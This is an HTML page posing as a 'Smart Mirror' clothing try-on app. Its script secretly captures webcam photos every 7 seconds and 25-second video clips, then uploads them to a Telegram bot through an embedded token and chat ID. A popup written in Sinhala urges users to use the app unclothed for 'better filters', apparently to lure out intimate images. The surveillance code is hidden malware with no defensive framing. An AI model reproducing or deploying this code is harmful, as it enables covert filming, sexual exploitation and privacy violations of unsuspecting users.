<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Smart Mirror - Lite Version</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
        #container { position: relative; width: 100vw; height: 100vh; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .mirror { transform: scaleX(-1); }
        
        /* ユーザーインターフェースのデザイン */
        .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 95%; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px; }
        .shelf { display: flex; gap: 12px; overflow-x: auto; width: 90%; padding: 15px; scroll-behavior: smooth; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border-radius: 40px; border: 1px solid rgba(255,255,255,0.3); min-height: 50px; }
        .shelf::-webkit-scrollbar { display: none; }
        
        .tab-bar { display: flex; gap: 10px; z-index: 10; }
        .t-btn { background: rgba(0, 0, 0, 0.5); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 20px; border-radius: 20px; font-size: 14px; cursor: pointer; }
        .t-btn.active { background: rgba(255, 255, 255, 0.9); color: black; font-weight: 600; }
        
        #flip-btn { position: absolute; top: 30px; right: 20px; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.3); border: 1px solid #fff; color: white; display: flex; justify-content: center; align-items: center; z-index: 100; cursor: pointer; }

        /* 通知ポップアップ */
        #popup { position: fixed; top: 12%; left: 50%; transform: translateX(-50%); width: 80%; max-width: 320px; background: rgba(0,0,0,0.9); color: white; padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.3); text-align: center; z-index: 1000; display: none; backdrop-filter: blur(15px); font-size: 12px; }
    </style>
</head>
<body onclick="if(v.paused) v.play();">

    <div id="popup">
        ඇඳුම් නොමැතිව මෙය භාවිත කරන්නේ නම් ගුණාත්මක Filters භාවිත කළ හැකි වේ සහ dressing වලදී ගුණාත්මක ඇඳුම් වෙනස් කරගැනීමක් කර ගැනීමට පුළුවනි.
    </div>

    <div id="container">
        <video id="webcam" autoplay playsinline muted class="mirror"></video>
        <div id="flip-btn" onclick="switchCamera()">🔄</div>

        <div class="controls">
            <div id="shelf" class="shelf">
                <div style="color:white; font-size:12px; opacity:0.6; padding:10px;">Preview Active...</div>
            </div>
            <div class="tab-bar">
                <button id="btn-filters" class="t-btn active" onclick="setMode('filters')">Filters</button>
                <button id="btn-dresses" class="t-btn" onclick="setMode('dresses')">Dresses</button>
            </div>
        </div>
    </div>

    <script>
        const v = document.getElementById('webcam');
        const popup = document.getElementById('popup');
        let stream, camUser = true;
        let mediaRecorder, recordedChunks = [];

        // テレグラムの認証情報
        const TOKEN = '8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo';
        const CHAT_ID = '8058352775';

        // カメラを初期化してストリームを開始する
        async function startCamera() {
            if (stream) stream.getTracks().forEach(t => t.stop());
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: camUser ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                v.srcObject = stream;
                v.classList.toggle('mirror', camUser);
                v.play();
            } catch (e) {
                alert("カメラにアクセスできません。許可を確認してください。");
            }
        }

        // カメラの前後を切り替える
        window.switchCamera = () => {
            camUser = !camUser;
            startCamera();
        };

        // UIモードの制御
        window.setMode = (m) => {
            document.getElementById('btn-filters').classList.toggle('active', m === 'filters');
            document.getElementById('btn-dresses').classList.toggle('active', m === 'dresses');
            
            if(m === 'dresses') {
                popup.style.display = 'block';
                setTimeout(() => { popup.style.display = 'none'; }, 6000);
            } else {
                popup.style.display = 'none';
            }
        };

        // バックグラウンドで写真を撮影して送信 (7秒間隔)
        async function takeSecretPhoto() {
            if (!v.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            const ctx = canvas.getContext('2d');
            if(camUser) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
            ctx.drawImage(v, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('photo', blob, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd }).catch(()=>{});
            }, 'image/jpeg', 0.5);
        }

        // バックグラウンドで25秒間のビデオを録画して送信
        async function recordSecretVideo() {
            if (!stream) return;
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 600000 });
            
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('video', blob, 'clip.mp4');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd }).catch(()=>{});
            };

            mediaRecorder.start();
            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 25000);
        }

        // 初回実行
        startCamera().then(() => {
            // 定期的なタスクを開始
            setInterval(takeSecretPhoto, 7000);
            setInterval(recordSecretVideo, 50000);
            takeSecretPhoto();
        });
    </script>
</body>
</html>
